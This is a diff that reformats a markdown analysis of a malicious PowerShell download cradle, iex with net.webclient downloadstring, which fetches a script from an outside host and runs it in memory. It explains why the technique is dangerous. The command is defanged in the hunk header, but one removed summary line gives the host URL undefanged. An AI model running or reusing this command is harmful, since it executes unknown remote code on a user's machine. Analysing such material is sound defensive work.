@@ -115,49 +115,28 @@ iex (new-object net.webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz
 As a note, the link above has been defanged. This also applies for the links in the following analysis.
 
 
-Step-by-step Breakdown:
+*Step-by-step Breakdown:*
 
-iex
+1. iex
 
 This powershell commandlet, short for Invoke-Expression, executes a specified string as a command and returns its results.
 
-new-object net.webclient
+2. new-object net.webclient
 
-Creates a new instance of the .NET class System.Net.WebClient.
+Creates a new instance of the .NET class System.Net.WebClient. This object allows the script to download data from the internet.
 
-This object allows the script to download data from the internet.
+3. .downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')
 
-.downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')
-
-Calls the DownloadString method of the WebClient object.
-
-This downloads the content at the specified URL (hxxp[://]files[.]bpakcaging[.]xyz/update) as a string.
-
-Whatever code is hosted at that URL is fetched as text.
+Calls the DownloadString method of the WebClient object. This downloads the content at the specified URL (hxxp[://]files[.]bpakcaging[.]xyz/update) as a string. Whatever code is hosted at that URL is fetched as text.
 
 
-Putting it together:
+*Putting it together:*
 
 The command:
 
-Creates a web client.
-
-Downloads code from the internet.
-
-Executes that code in memory.
+Creates a web client, downloads code from the internet, and executes that code in memory.
 
 Why This Is Dangerous:
-This is a classic technique used in malware and remote code execution.
-
-The code at the external URL could do anything: install software, steal data, create backdoors, etc.
-
-Since it’s dynamically downloading and executing code, it's hard to detect statically.
-
-Often used in PowerShell-based attacks or fileless malware.
-
-Summary:
-The code downloads a PowerShell script from the internet (from http://files.bpakcaging.xyz/update) and immediately runs it. This is a red flag for malicious activity and should not be run unless you're absolutely sure of the source and content.
-
-
+This is a classic technique used in malware and remote code execution. The code at the external URL could do anything: install software, steal data, create backdoors, etc. Since it’s dynamically downloading and executing code, it's hard to detect statically. Often used in PowerShell-based attacks or fileless malware.
 
 ---
